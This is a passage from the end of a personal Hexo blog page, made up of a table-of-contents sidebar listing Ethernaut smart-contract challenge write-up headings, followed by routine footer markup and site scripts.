class="nav-text">14 Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-1"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-1"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-1"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-1"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-Naught-Coin"><span class="nav-text">15 Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-2"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-2"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-2"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-2"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-Preservation"><span class="nav-text">16 Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-3"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-3"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-3"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-3"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-Recovery"><span class="nav-text">17 Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-4"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-4"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-4"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Expoit"><span class="nav-text">Expoit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-MagicNumber"><span class="nav-text">18 MagicNumber</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-5"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-5"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-5"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-4"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-Alien-Codex"><span class="nav-text">19 Alien Codex</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-6"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-6"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-6"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-5"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-Denial"><span class="nav-text">20 Denial</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-7"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-7"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-7"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-6"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-Shop"><span class="nav-text">21 Shop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-8"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-8"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-8"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-7"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22-Dex"><span class="nav-text">22 Dex</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-9"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-9"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-9"><span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit-8"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23-Dex-Two"><span class="nav-text">23 Dex Two</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-10"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-10"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-10"><span class="nav-text">Analysis</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#24-Puzzle-Wallet"><span class="nav-text">24 Puzzle Wallet</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-11"><span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Description-11"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis-11"><span class="nav-text">Analysis</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">Always say hello to the world!</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-regular fa-snowman-head fa-bounce" style="color: #4d8eff;"></i>&nbsp;&nbsp;<a href="/">f4tb3e</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        8 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fa-solid fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fa-solid fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>



    
<script src="/js/tools/localSearch.js" type="module"></script>




    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>









<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
